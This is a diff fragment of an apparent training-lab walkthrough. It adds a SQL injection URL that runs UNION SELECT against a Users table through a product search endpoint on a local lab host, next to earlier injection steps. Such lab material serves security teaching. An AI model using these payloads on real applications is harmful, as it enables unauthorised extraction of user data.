@@ -14,6 +14,8 @@ http://labs.training.local/rest/products/search?q=test’)) --
 10. 
 ``` 
 http://labs.training.local/rest/products/search?q=test’)) UNION SELECT * FROM Users --
+
+http://labs.training.local/rest/products/search?q=test')) UNION SELECT '1', '2', '3', '4' FROM Users --
 ``` 
 11. 
 ``` 
